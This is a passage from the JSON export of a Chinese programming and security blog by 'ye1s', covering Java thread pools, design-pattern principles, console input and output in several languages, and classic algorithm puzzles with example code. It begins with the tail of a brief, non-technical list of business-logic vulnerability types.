cookie中设定session参数，以防cookie可以长时间生效。 根据业务不同还有很多方法 找回密码功能缺陷 单纯读取内存值作为用户凭证 电商系统加车、下单漏洞 参考文章:https://github.com/PyxYuYu/MyBlog/issues/102","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"业务逻辑漏洞","slug":"业务逻辑漏洞","permalink":"https://blog.cfyqy.com/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"}],"author":"ye1s"},{"title":"java线程池","slug":"java线程池","date":"2019-10-10T10:28:00.000Z","updated":"2020-04-13T07:39:06.000Z","comments":true,"path":"article/98e86a33.html","link":"","permalink":"https://blog.cfyqy.com/article/98e86a33.html","excerpt":"线程池是一种多线程处理形式，处理过程中将任务添加到队列，然后在创建线程后自动启动这些任务。线程池线程都是后台线程。每个线程都使用默认的堆栈大小，以默认的优先级运行，并处于多线程单元中。如果某个线程在托管代码中空闲（如正在等待某个事件）,则线程池将插入另一个辅助线程来使所有处理器保持繁忙。如果所有线程池线程都始终保持繁忙，但队列中包含挂起的工作，则线程池将在一段时间后创建另一个辅助线程但线程的数目永远不会超过最大值。超过最大值的线程可以排队，但他们要等到其他线程完成后才启动。","text":"线程池是一种多线程处理形式，处理过程中将任务添加到队列，然后在创建线程后自动启动这些任务。线程池线程都是后台线程。每个线程都使用默认的堆栈大小，以默认的优先级运行，并处于多线程单元中。如果某个线程在托管代码中空闲（如正在等待某个事件）,则线程池将插入另一个辅助线程来使所有处理器保持繁忙。如果所有线程池线程都始终保持繁忙，但队列中包含挂起的工作，则线程池将在一段时间后创建另一个辅助线程但线程的数目永远不会超过最大值。超过最大值的线程可以排队，但他们要等到其他线程完成后才启动。 线程池的作用：线程池作用就是限制系统中执行线程的数量。根 据系统的环境情况，可以自动或手动设置线程数量，达到运行的最佳效果；少了浪费了系统资源，多了造成系统拥挤效率不高。用线程池控制线程数量，其他线程排 队等候。一个任务执行完毕，再从队列的中取最前面的任务开始执行。若队列中没有等待进程，线程池的这一资源处于等待。当一个新任务需要运行时，如果线程池 中有等待的工作线程，就可以开始运行了；否则进入等待队列。 为什么要用线程池1.减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务。 2.可以根据系统的承受能力，调整线程池中工作线线程的数目，防止因为消耗过多的内存，而把服务器累趴下(每个线程需要大约1MB内存，线程开的越多，消耗的内存也就越大，最后死机)。 java线程池Java里面线程池的顶级接口是Executor，但是严格意义上讲Executor并不是一个线程池，而只是一个执行线程的工具。真正的线程池接口是ExecutorService。 Java通过Executors提供四种线程池，分别为： 1.newSingleThreadExecutor创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。 2.newFixedThreadPool创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。 3.newCachedThreadPool创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程， 那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。 4.newScheduledThreadPool创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。 实现代码: 固定大小的线程池，newFixedThreadPoolr 123456789101112131415161718192021222324252627282930import java.util.concurrent.Executors;import java.util.concurrent.ExecutorService;public class Test &#123; public static void main(String[] args) &#123; // 创建一个可重用固定线程数的线程池 ExecutorService pool = Executors.newFixedThreadPool(3); // 创建线程 Thread t1 = new MyThread(); Thread t2 = new MyThread(); Thread t3 = new MyThread(); Thread t4 = new MyThread(); Thread t5 = new MyThread(); // 将线程放入池中进行执行 pool.execute(t1); pool.execute(t2); pool.execute(t3); pool.execute(t4); pool.execute(t5); // 关闭线程池 pool.shutdown(); &#125;&#125;class MyThread extends Thread &#123; @Override public void run() &#123; System.out.println(Thread.currentThread().getName() + \"正在执行。。。\"); &#125;&#125; 结果 12345pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-2正在执行。。。pool-1-thread-3正在执行。。。 从以上结果可以看出，newFixedThreadPool的参数指定了可以运行的线程的最大数目，超过这个数目的线程加进去以后，不会运行。其次，加入线程池的线程属于托管状态，线程的运行不受加入顺序的影响。 单任务线程池，newSingleThreadExecutor 仅仅是把上述代码中的ExecutorService pool = Executors.newFixedThreadPool(2)改为ExecutorService pool = Executors.newSingleThreadExecutor(); 输出结果: 12345pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-1正在执行。。。 可变尺寸的线程池，newCachedThreadPool 与上面的类似，只是改动下pool的创建方式：ExecutorService pool = Executors.newCachedThreadPool(); 12345pool-1-thread-2正在执行。。。pool-1-thread-3正在执行。。。pool-1-thread-1正在执行。。。pool-1-thread-4正在执行。。。pool-1-thread-5正在执行。。。 延迟连接池，newScheduledThreadPool 123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.concurrent.ScheduledThreadPoolExecutor;import java.util.concurrent.TimeUnit;/** * @author ye1s * Time 2019/10/10 20:12 */public class TestScheduledThreadPoolExecutor &#123; public static void main(String[] args) &#123; ScheduledThreadPoolExecutor exec = new ScheduledThreadPoolExecutor(1); exec.scheduleAtFixedRate(new Runnable() &#123;//每隔一段时间就触发异常 @Override public void run() &#123; //throw new RuntimeException(); System.out.println(\"================\"); &#125; &#125;, 1000, 5000, TimeUnit.MILLISECONDS); exec.scheduleAtFixedRate(new Runnable() &#123;//每隔一段时间打印系统时间，证明两者是互不影响的 @Override public void run() &#123; System.out.println(System.nanoTime()); &#125; &#125;, 1000, 2000, TimeUnit.MILLISECONDS); &#125;&#125; 输出结果 1234567891011121314151617181920212223242526================417924475297774179444739066641796446332000================4179844735377741800446264888================418024459511114180444572577741806446000888================4180844561111141810446280444================418124457928884181444690666641816445674666================4181844560888841820445764888================418224460377774182444596222241826445616888================ ThreadPoolExecutorThreadPoolExecutor源码分析https://juejin.im/post/5d131ce7f265da1b67211e03#heading-0 ThreadPoolExecutor使用https://www.jianshu.com/p/f030aa5d7a28参考文章 Java 四种线程池的用法分析 java多线程系列：ThreadPoolExecutor源码分析 ThreadPoolExecutor源码分析","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java线程池","slug":"java线程池","permalink":"https://blog.cfyqy.com/tags/java%E7%BA%BF%E7%A8%8B%E6%B1%A0/"}],"author":"ye1s"},{"title":"设计模式23种","slug":"计模式23种","date":"2019-10-07T10:34:00.000Z","updated":"2020-04-13T07:46:42.000Z","comments":true,"path":"article/769d5dad.html","link":"","permalink":"https://blog.cfyqy.com/article/769d5dad.html","excerpt":"设计模式","text":"设计模式 URL中的类图以及类图之间的关系类、接口和类图类:是具有相同属性、方法和关系的对象的抽象，它封装了数据和行为，具有封装性、继承性和多态性等三大特性。 接口:接口是一种特殊的类，它具有类的结构但不可被实例化，只可以被子类实现，它包含抽象操作，但不包含属性。它包含了类和组件对外可见的动作。 类图: 是用来显示系统中的类、接口、协作以及它们之间的静态结构和关系的一种静态模型。它主要用于描述软件系统的结构化设计，帮助人们简化对软件系统的理解，它是系统分析与设计阶段的重要产物，也是系统编码与测试的重要模型依据。 类之间的关系 依赖关系:依赖（Dependency）关系是一种使用关系，它是对象之间耦合度最弱的一种关联方式，是临时性的关联。在代码中，某个类的方法通过局部变量、方法的参数或者对静态方法的调用来访问另一个类（被依赖类）中的某些方法来完成一些职责。 关联关系:关联（Association）关系是对象之间的一种引用关系，用于表示一类对象与另一类对象之间的联系，如老师和学生、师傅和徒弟、丈夫和妻子等。关联关系是类与类之间最常用的一种关系，分为一般关联关系、聚合关系和组合关系。 聚合关系:聚合（Aggregation）关系是关联关系的一种，是强关联关系，是整体和部分之间的关系，是 has-a 的关系。 组合（Composition）关系也是关联关系的一种，也表示类之间的整体与部分的关系，但它是一种更强烈的聚合关系，是 cxmtains-a 关系。 泛化（Generalization）关系:是对象之间耦合度最大的一种关系，表示一般与特殊的关系，是父类与子类之间的关系，是一种继承关系，是 is-a 的关系。 实现（Realization）关系是接口与实现类之间的关系 对象设计原则 开闭原则的含义是：当应用的需求改变时，在不修改软件实体的源代码或者二进制代码的前提下，可以扩展模块的功能，使其满足新的需求 里氏替换原则通俗来讲就是：子类可以扩展父类的功能，但不能改变父类原有的功能。也就是说：子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法 依赖倒置原则的目的是通过要面向接口的编程来降低类间的耦合性，所以我们在实际编程中只要遵循以下4点，就能在项目中满足这个规则。 每个类尽量提供接口或抽象类，或者两者都具备。 变量的声明类型尽量是接口或者是抽象类。 任何类都不应该从具体类派生。 使用继承时尽量遵循里氏替换原则。 单一职责原则的核心就是控制类的粒度大小、将对象解耦、提高其内聚性 接口隔离原则（Interface Segregation Principle，ISP）要求程序员尽量将臃肿庞大的接口拆分成更小的和更具体的接口，让接口中只包含客户感兴趣的方法 迪米特法则：如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。 合成复用原则:它要求在软件复用时，要尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现 设计模式创建型模式创建型模式的作用就是创建对象，说到创建一个对象，最熟悉的就是 new 一个对象，然后 set 相关属性。但是，在很多场景下，我们需要给客户端提供更加友好的创建对象的方式，尤其是那种我们定义了类，但是需要提供给其他开发者用的时候。 简单工厂模式最简单； 工厂模式在简单工厂模式的基础上增加了选择工厂的维度，需要第一步选择合适的工厂； 抽象工厂模式有产品族的概念，如果各个产品是存在兼容性问题的，就要用抽象工厂模式。 单例模式就不说了，为了保证全局使用的是同一对象，一方面是安全性考虑，一方面是为了节省资源； 建造者模式专门对付属性很多的那种类，为了让代码更优美； 原型模式用得最少，了解和 Object 类中的 clone() 方法相关的知识即可 结构型模式结构型模式旨在通过改变代码结构来达到解耦的目的，使得我们的代码容易维护和扩展。 代理模式是做方法增强的， -配器模式是把鸡包装成鸭这种用来适配接口的， 桥梁模式做到了很好的解耦， 装饰模式从名字上就看得出来，适合于装饰类或者说是增强类的场景， 门面模式的优点是客户端不需要关心实例化过程，只要调用需要的方法即可， 组合模式用于描述具有层次结构的数据 享元模式是为了在特定的场景中缓存已经创建的对象，用于提高性能。 行为型模式行为型模式关注的是各个类之间的相互作用，将职责划分清楚，使得我们的代码更加地清晰。 观察者模式 责任链模式 模板方法模式 策略模式 迭代子模式 命令模式 状态模式 备忘录模式 访问者模式 中介者模式 解释器模式 参考文章: 软件设计模式概述 设计模式也可以这么简单","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://blog.cfyqy.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"author":"ye1s"},{"title":"编程语言输入输出","slug":"编程语言输入输出","date":"2019-09-29T13:16:00.000Z","updated":"2020-04-13T08:38:27.000Z","comments":true,"path":"article/32b13de7.html","link":"","permalink":"https://blog.cfyqy.com/article/32b13de7.html","excerpt":"常见语言的输入输出","text":"常见语言的输入输出 java输入next(): 1、一定要读取到有效字符后才可以结束输入。 2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。 3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。 next() 不能得到带有空格的字符串。 nextLine()： 1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。 2、可以获得空白。has**():判断下面是否有输入符合要求的内容 注意点 如果在nextLine()，之前有其他的输入的话(不包含nextLine(),也就是说2个nextLine()不会出现这个问题)，nextLine()会无法输入，原因是：nextLine()会读取之前输入的 回车 ‘\\n’ ，也就是说是读取了，但是读取了上一个输入的回车，所以解决方法就是：加多一个nextLine()来读取上一次的回车即可； 例子: 12345678910111213141516171819202122class Solution &#123; public static void main(String[] args) &#123; Scanner sc=new Scanner(System.in); int n=0; String str=\"\"; List&lt;String&gt; strs=new ArrayList&lt;&gt;(); System.out.print(\"请输入你要输入的字符串个数:\"); if(sc.hasNextInt())&#123; n=sc.nextInt(); &#125; sc.nextLine();// for(int i=0;i&lt;n;i++)&#123; if(sc.hasNextLine())&#123; str=sc.nextLine(); strs.add(str); &#125; &#125; for(String e : strs)&#123; System.out.println(e); &#125; &#125;&#125; 获取一行的多个字符串 1234567891011class Solution &#123; public static void main(String[] args) &#123; Scanner sc=new Scanner(System.in); String str=sc.nextLine(); String[] strs=str.split(\"\\\\s+\"); for (String e:strs) &#123; System.out.format(\"%s\",e); &#125; &#125;&#125; 输出1234System.out.println(1111);//换行打印System.out.print(1111);//不换行打印System.out.write(2222);//字节输出System.out.printf(\"%+8.3f\\n\", 3.14);//按格式输出 python2输入1.输入为一个int类型的数据 1n &#x3D; input() 2.输入为字符串 12arr &#x3D; raw_input()，此时得到的为字符串本身，如输入adae，得到的是字符串&#39;adae&#39;。arr &#x3D; sys.stdin.readline()，若采用这种方式，此时得到的为&#39;adae\\n’，末尾多了一个换行符，需要把这个换行符截断，一般直接采用arr &#x3D; sys.stdin.readline().strip(&#39;\\n&#39;），即可得到正常的输入字符串 3.输入为一行int类型数据，如 2 4 5 6 7 12arr &#x3D; map(int, raw_input().split())arr &#x3D; map(int, sys.stdin.readline().strip(&#39;\\n&#39;）.split()) 首先用split将输入的字符串按空格分开，split默认分隔方式为空格，可针对输入数据格式调整，如输入为2，4，5，6，7，用逗号隔开，那么这里可以使用split(‘,’）。map函数则是根据提供的函数（这里的函数是int函数），对制定序列做映射（这里的序列是将输入字符串按空格分割的结果），上面的使用方式，左右是把分割后的列表逐元素映射为int类型，即可得到包含一行输入元素的列表。 4.多行输入 可采用lines = sys.stdin.readlines(），一次性读取多行输入。再使用for line in lines处理每一行输入，但要注意，这里的line会包含末尾的’\\n’换行符，要进行处理，line = line.strip(‘\\n‘)，再进行后续处理。这种适合牛客网的在线编程，但在本地IDE调试程序时，不要使用这样的方式，程序会一直读取输入。 输出1print 1,2 python3输入1input() 内置函数input([prompt])，用于从标准输入读取一个行，并返回一个字符串（去掉结尾的换行符 输出最简单的输出方法是用print语句，你可以给它传递零个或多个用逗号隔开的表达式： 12print([object, ...][, sep&#x3D;&#39; &#39;][, end&#x3D;&#39;endline_character_here&#39;][, file&#x3D;redirect_to_here]) 方括号内是可选的，sep表示分割符，end表示结束符，file表示重定向文件。如果要给sep、end、file指定值必须使用关键字参数。 12print(&#39;hello&#39;, &#39;world&#39;, sep&#x3D;&#39;%&#39;) # 输出hello%worldprint(&#39;hello&#39;, &#39;world&#39;, end&#x3D;&#39;*&#39;) # 输出hello world*，并且不换行 c格式化输入输出printf和scanf其中printf为按格式输入函数，它格式定义以%开头，后面字母代表的意义如下： 123456789101112d 以十进制形式输出带符号整数(正数不输出符号)o 以八进制形式输出无符号整数(不输出前缀 0)x,X 以十六进制形式输出无符号整数(不输出前缀 Ox)u 以十进制形式输出无符号整数f 以小数形式输出单、双精度实数e,E 以指数形式输出单、双精度实数g,G 以%f 或%e 中较短的输出宽度输出单、双精度实数c 输出单个字符s 输出字符串- 结果左对齐,右边填空格+ 输出符号(正号或负号)# 输出值为正时冠以空格,为负时冠以负号 关于scanf则是与printf相对，它是功能是按格式输入，例如： 12345678910111213#include &lt;stdio.h&gt;main()&#123; char ch; int a,b; float c,d; char str[20]; scanf(\"%c,%d,%d,%f,%f,%s\", &amp;ch, &amp;a, &amp;b, &amp;c, &amp;d, str); printf(\"%c,%d,%d,%f,%f,%s\\n\", ch, a, b, c, d, str);&#125; a,1,2,3.3,4.4,Helloa,1,2,3.300000,4.400000,Hello scanf() 关于scanf也有一个地方需要读者注意，在调用scanf函数时我们向其传入的参数变量前要加入一个&amp;符号，用于表示这个变量的内存地址，而数组型变量除外。 调用格式为：scanf(“&lt;格式化字符串&gt;”,&lt;地址表&gt;);scanf的返回值 1234567891011scanf()函数返回成功赋值的数据项数读到文件末尾出错时则返回EOF。如：scanf(\"%d%d\", &amp;a, &amp;b);如果a和b都被成功读入，那么scanf的返回值就是2如果只有a被成功读入，返回值为1如果a和b都未被成功读入，返回值为0如果遇到错误或遇到end of file，返回值为EOF且返回值为int型空白符:空白字符会使scanf()函数在读操作中略去输入中的一个或多个空白字符。非空白符:一个非空白字符会使scanf()函数在读入时剔除掉与这个非空白字符相同的字符 非格式化输入输出puts()和gets()函数 puts()函数 头文件为stdio.h puts()函数用来向标准输出设备（屏幕）写字符串并换行 调用格式为puts(s)，其中s为字符串变量（字符串数组名或字符串指针）。puts()函数的作用于printf(“%s\\n”,s)相同例如：1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void)&#123; char s[20],* f; strcpy(s,\"Hello!\"); f=\"Thank you \"; puts(s); puts(f); return 0; &#125; 说明(1) puts()函数只能输出字符串，不能输出数值或者进行格式变换(2) 可以将字符串直接写入puts()函数中。如puts(“Hello,Tuuu”) gets()函数 头文件为stdio.h char * gets(char * str); gets()函数用来向标准输入设备（键盘）读取字符串直到回车结束,不同于fgets，它没有指定num，所以需要注意字符数组str的大小 调用格式为gets(s),其中s为字符串变量（字符串数组名或者字符串指针）。gets()函数的作用于scanf(“%s”,&amp;s)函数作用类似，使用``scanf(“%s”,&amp;s) 函数输入字符串时存在一个问题, 就是如果输入了空格会认为输入字符串结束,空格后的字符将作为下一个输入项处理, 但gets() 函数将接收输入的整个字符串直到回车为止。 putchar()、getch()、getche()和getchar()函数，附fgets函数 putchar()函数等同于printf(“%c”,ch) getch()函数、getche()函数 头文件 conio.h 并非标准C中的函数，建议还是使用getchar() int getch(void)当你用键盘输入的时候，屏幕不显示你所输入的字符（不带回显），不需要按回车，程序自动继续进行 int getche(void)屏幕显示你所输入与的字符（带回显），不需要按回车，程序自动继续进 getchar()函数 头文件 stdio.h int getchar(void) 从标准输入stdin读入一个字符，程序等待你输入的时候你可以输入多个字符，回车后程序继续执行。但是getchar实际上制度如第一个字符。 常用在exe中暂停程序。 fgets()函数 char * fgets(char * str, int num, FILE * stream); 头文件stdio.h 从流stream中读入最多num个字符到字符数组str中，当遇到换行符的时候，或者读到num-1个字符时候停止。自动加上’\\0’空字符结尾 c++cout语句一般格式： cout&lt;&lt;表达式1&lt;&lt;表达式2&lt;&lt;……&lt;&lt;表达式n; cin语句一般格式： cin&gt;&gt;表达式1&gt;&gt;表达式2&gt;&gt;……&gt;&gt;表达式n; php","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"编程语言","slug":"编程语言","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}],"author":"ye1s"},{"title":"编程之美-22个经典问题","slug":"编程之美-22个经典问题","date":"2019-09-27T02:19:00.000Z","updated":"2020-04-13T07:47:26.000Z","comments":true,"path":"article/182203a9.html","link":"","permalink":"https://blog.cfyqy.com/article/182203a9.html","excerpt":"","text":"Z字形排列问题字形编排过程大致是这样的：经过前期处理的图像被分为若干个 的小图像块，此时就从小图像块的左上角开始沿Z字形对图像元素进行遍历，并将遍历所得的结果重新写入等大小的图像块中 Z字形编排问题主要应用在JPEG编码上，也叫Zigzag。主要思路就是从左上角第一个像素开始以Z字形进行编排。 经过Z自行排列之后，原图像矩阵中的序号变为如下图所示： 总结规律 对于原始矩阵matrix中的任意元素matrix[i][j]的遍历走向规律可以分为如下三种情况（偶数情况下） 1、如果二维数组中的元素matrix[i][j]中纵坐标j是偶数，且i=0或者i=7，那么遍历路径在矩阵中的走向就是水平向右移动一格。 2、如果二维数组中的元素matrix[i][j]中横坐标i是奇数，且j=0或者j=7，，那么遍历路径在矩阵中的走向就是垂直向下移动一格。 3、除上述规则以外的情况，如果二维数组中的元素matrix[i][j]的横纵坐标和i+j是偶数，则遍历路径在矩阵中的走向就是右上角移动一格；否则，若i+j是奇数，则遍历路径在矩阵中的走向就是左下角移动一格。 实现: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;iostream&gt;#include&lt;iomanip&gt;using namespace std;#define SIZE 8 int main(int argc, char** argv)&#123; int matrix[SIZE][SIZE]=&#123;0&#125;; int a[SIZE][SIZE]=&#123;0&#125;; int i,j ,x,y,value=0; int *p; p=&amp;matrix[0][0]; for(i=0;i&lt;SIZE*SIZE;i++)&#123; *p++=i; &#125; cout&lt;&lt;\"原始矩阵如下:\"&lt;&lt;endl; for(i=0;i&lt;SIZE;i++)&#123; for(j=0;j&lt;SIZE;j++)&#123; cout&lt;&lt;setw(4)&lt;&lt;*(*(matrix+i)+j); &#125; cout&lt;&lt;endl; &#125; i=0;j=0; //进行Z字编排 for(x=0;x&lt;SIZE;x++)&#123; for(y=0;y&lt;SIZE;y++)&#123; *(*(a+i)+j)=*(*(matrix+x)+y); if((i==SIZE-1||i==0)&amp;&amp;j%2==0)&#123; j++; continue; &#125; if((j==0||j==SIZE-1)&amp;&amp;i%2==1)&#123; i++; continue; &#125; if((i+j)%2==0)&#123; i--; j++; &#125;else if((i+j)%2==1)&#123; i++; j--; &#125; &#125; &#125; cout&lt;&lt;endl&lt;&lt;\"经过Z字形编排后的矩阵如下:\"&lt;&lt;endl; for(i=0;i&lt;SIZE;i++)&#123; for(j=0;j&lt;SIZE;j++)&#123; cout&lt;&lt;setw(4)&lt;&lt;*(*(a+i)+j); &#125; cout&lt;&lt;endl; &#125;&#125; 大整数乘法问题由于计算机精度有限，因此单纯使用程序设计语言提供的原子数据类型来完成两个大整数的乘法显然是不合时宜的。因此考虑采用数组对大整数的每一位进行保存再进行运算从而解决了大整数的运算问题。![C++原子数据类型及取值范围](../../images/arithmetic/20180308101518243 .png) 实现: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;#include &lt;memory.h&gt; #define SIZE 14 //传递数组和数组长度int* multi(int* num1, int size1, int* num2, int size2)&#123; int size = size1 + size2; int *ret = new int[size]; int i = 0; memset(ret, 0, sizeof(int)*size); for(i = 0; i &lt; size2; ++i) &#123; int k = i; for(int j = 0; j &lt; size1; ++j) &#123; ret[k++] += num2[i] * num1[j]; &#125; &#125; for(i = 0; i &lt; size; ++i) &#123; if(ret[i] &gt;= 10) &#123; ret[i+1] += ret[i]/10; ret[i] %= 10; &#125; &#125; return ret;&#125; int main()&#123; int num1[SIZE] = &#123;1, 1, 1, 1, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1&#125;; int num2[SIZE] = &#123;5, 5, 4, 4, 4, 3, 3, 3, 2, 2, 2, 1, 1, 1&#125;; int* rej = multi(num1, SIZE, num2, SIZE); for(int i = SIZE*2-1; i &gt;= 0; i--) &#123; cout&lt;&lt; rej[i]; &#125; delete[] rej;//释放空间 return 0;&#125; 九宫格问题九宫格是一种古老的数学游戏，它要求在3X3的矩阵中，填入1-9这9个数字，并且横向、纵向、斜向上的3个数字之和皆相等。类似问题在数学上被称为幻方。现将九宫格推广到5X5，7X7等幻方问题。根据求解口诀““一居上行正中央,依次斜填切莫忘;上出框时向下放,右出框时向左放;排重便在下格填,右上排重一个样”。所谓一居上行正中央说的是1在第一行的正中，依次 斜填切莫忘说的是一直向右上方填， 上出框时往下填是斜填到方框上面去了，就放在这竖行的最下边， 右出框时左边放是说斜填到右框外面，就在横行左边放， 排重便在下格填是斜填上面有数字了，就在自己的下面放， 右上排重一个样就是右上格上面没有格子了，就和排重一样，放在自己的下面。 根据一个用户输入的奇数，作为幻方矩阵的大小输出一个对应的矩阵。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;memory.h&gt;using namespace std;int main(int argc,char** argv)&#123; cout&lt;&lt;\"请输入幻方的大小n:\"; int n=1; cin&gt;&gt;n; cout&lt;&lt;endl; int **a=new int*[n]; for(int i=0;i&lt;n;++i)&#123; a[i]=new int[n]; memset(a[i],0,n*sizeof(int)); &#125; int row=0; int col=n/2; for(int i=1;i&lt;=n*n;i++)&#123; a[row][col]=i; row--; col++; if(row&lt;0&amp;&amp;col&gt;=n)&#123; col--; row+=2; &#125;else if(row&lt;0)&#123; row=n-1; &#125; else if(col&gt;=n)&#123; col=0; &#125;else if (a[row][col]!=0)&#123; col--; row+=2; &#125; &#125; for(int i=0;i&lt;n;i++)&#123; for(int j=0;j&lt;n;j++)&#123; cout&lt;&lt;setw(6)&lt;&lt;a[i][j]; &#125; cout&lt;&lt;endl; &#125; for(int i=n;i&gt;0;)&#123; delete[] a[--i]; &#125; delete[] a; return 0; &#125; 约瑟夫环问题N个人围成一圈，从第一个人开始报数，报到m的人出圈，剩下的人继续从1开始报数，报到m的人出圈；如此往复，直到所有人出圈。（模拟此过程，输出出圈的人的序号） 链表解法: 12345678910111213141516171819202122232425262728293031323334import java.util.LinkedList;import java.util.Scanner;/** * @author ye1s * Time 2019/9/26 22:00 */public class Solution &#123; public static int Joseph(int n,int m)&#123; LinkedList&lt;Integer&gt; queue=new LinkedList&lt;&gt;(); for(int i=1;i&lt;=n;i++)&#123; queue.add(i); &#125; while(queue.size()!=1)&#123; for(int i=1;i&lt;m;i++)&#123; queue.add(queue.poll()); &#125; int num=queue.poll(); System.out.println(num); &#125; System.out.println(\"最后幸存的编码为:\"+queue.peek()); return queue.peek(); &#125; public static void main(String[] args) &#123; Scanner sc=new Scanner(System.in); int n=sc.nextInt(); int m=sc.nextInt(); sc.close(); Joseph(n,m); &#125; &#125; 数学解法: 1234567public int LastRemaining_Solution(int n, int m) &#123; if (n == 0) /* 特殊输入的处理 */ return -1; if (n == 1) /* 递归返回条件 */ return 0; return (LastRemaining_Solution(n - 1, m) + m) % n;&#125; 魔术师发牌问题魔术师利用一副牌中的13张黑桃牌，预先将他们排好后叠放在一起，牌面朝下。对观众说：“我不看牌，只数数就可以猜到每张牌是什么， 我大声数数，你们听，不信？现场演示。”魔术师将牌堆最上面的哪张排数为1，把他翻过来正好是黑桃A，将黑桃A从牌堆抽出放在桌子上， 第二次数1、2，将第一张放在牌堆最下面，第二张翻开，正好是黑桃2，也将它抽出放在桌子上。这样依次进行将13将牌全部翻出，准确无误。问牌最开始的顺序是怎样排的。 12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std; int main()&#123; int a[13]; for(int i=1;i&lt;13;i++)&#123; a[i]=0; &#125; a[0]=1; int n=1; for(int i=2;i&lt;14;i++)&#123; for(int j=0;j&lt;i;)&#123; if(a[n%13]==0)&#123; j++; if(j==i)&#123; a[n%13]=i; break; &#125; &#125; n++; &#125; &#125; for(int i=0;i&lt;13;i++)&#123; cout&lt;&lt;a[i]&lt;&lt;\" \"; &#125; return 0;&#125; 拉丁方阵的问题拉丁方阵是一种n×n的方阵，方阵中恰有n种不同的元素，每种元素恰有n个，并且每种元素在一行和一列中恰好出现一次。著名数学家和物理学家欧拉使用拉丁字母来作为拉丁方阵里元素的符号，拉丁方阵因此而得名。 不知道你发现这样一个规律没？比如3 x 3的拉丁方阵，第一行是1，2，3，第二行好像都向前移了一位，然后第一个元素跑到了最后面… 实现: 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std; int main()&#123; int n,i,j,k,t; cout&lt;&lt;\"please input num:\"; cin&gt;&gt;n; for(i=0;i&lt;n;i++)&#123;/构造N个不同的拉丁方阵 for(j=0;j&lt;n;j++)&#123; t=(i+j)%n; //*确定该拉丁方阵第i 行的第一个元素的值 for(k=0;k&lt;n;k++)&#123;//依照环的形式输出该行中的各个元素*/ cout&lt;&lt;(k+t)%n+1; &#125; cout&lt;&lt;endl; &#125; cout&lt;&lt;endl; &#125; return 0; &#125; 维吉尼亚加密法问题https://www.cnblogs.com/inverseEntropy/p/10151176.html 括号匹配问题","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"经典问题","slug":"经典问题","permalink":"https://blog.cfyqy.com/tags/%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"}],"author":"ye1s"},{"title":"面试编程题-整理","slug":"面试编程题-整理","date":"2019-09-23T17:09:17.000Z","updated":"2020-04-13T07:49:23.000Z","comments":true,"path":"article/b6c47sd.html","link":"","permalink":"https://blog.cfyqy.com/article/b6c47sd.html","excerpt":"笔试中遇到的不会做的题目整理","text":"笔试中遇到的不会做的题目整理 求最大的组合数求最大的组合数：用不同的数字组合，找到最大的那一个组合 scanner类 求最大的组合数思路:自定义符合要求的排序方式，实现符合要求的结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.util.Arrays;import java.util.Scanner;import java.util.Vector;public class StringSort &#123; public static void main(String[] args) &#123; //String ss[]=&#123;\"9\",\"2\",\"20\",\"22\"&#125;; Scanner sc=new Scanner(System.in); Vector&lt;String&gt; v=new Vector&lt;&gt;(); if(sc.hasNextLine())&#123; String[] inputString=sc.nextLine().split(\"\\\\s+\"); for(String s: inputString )&#123; v.add(s); &#125; &#125; sc.close(); MyString mySs[]=new MyString[v.size()]; for (int i = 0; i &lt; v.size(); i++) &#123; mySs[i]=new MyString(v.get(i)); &#125; 